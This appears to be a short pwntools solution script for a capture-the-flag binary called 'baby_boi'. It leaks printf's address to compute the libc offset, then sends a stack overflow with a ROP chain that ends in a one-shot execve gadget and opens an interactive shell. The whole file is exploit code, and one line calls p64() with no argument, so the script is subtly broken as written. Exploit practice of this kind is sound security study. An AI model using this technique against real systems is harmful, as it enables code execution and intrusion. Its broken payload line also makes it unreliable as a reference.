#!/usr/bin/env python3
from pwn import *

BUF_SIZE = 0x28
POP_R12_GADGET = 0x0000000000102df7
POP_RDI_GADGET = 0x0000000000101dee
POP_RBP_GADGET = 0x00000000000256bf
EXECVE_ONE_SHOT = 0xe4d5b

context.terminal = ["alacritty", "-e", "bash", "-c"] 
pr = pwnlib.gdb.debug("./baby_boi")
libc = ELF("/usr/lib/libc.so.6")

pr.recvuntil(b"am: ")
printfAddress = int(pr.recvline().strip(b"\n"), 16)
offset = printfAddress - libc.symbols["printf"]

print("printfAddress libc: " + hex(libc.symbols["printf"]) + "; relocated: " + hex(printfAddress) + "; offset " + hex(offset))

payload = b"\x00" * BUF_SIZE
payload += p64(POP_R12_GADGET + offset)
payload += p64(0x00)
payload += p64(POP_RDI_GADGET + offset)
payload += p64(0x00)
payload += p64(POP_RBP_GADGET + offset)
payload += p64()
payload += p64(EXECVE_ONE_SHOT + offset)

pr.sendline(payload)
pr.interactive()